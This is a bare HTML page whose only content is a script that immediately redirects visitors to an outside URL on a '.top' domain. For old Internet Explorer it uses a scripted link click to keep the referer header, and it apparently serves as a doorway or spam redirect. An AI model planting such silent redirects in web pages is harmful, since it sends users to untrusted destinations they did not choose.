<html>
<body>

<script type="text/javascript">
    var url = "http://infowork.top/sl42";
    if(typeof IE_fix != "undefined") // IE8 and lower fix to pass the http referer
    {
        document.write("redirecting..."); // Don't remove this line or appendChild() will fail because it is called before document.onload to make the redirect as fast as possible. Nobody will see this text, it is only a tech fix.
        var referLink = document.createElement("a");
        referLink.href = url;
        document.body.appendChild(referLink);
        referLink.click();
    }
    else { window.location.replace(url); } // All other browsers
</script>


</body>
</html>
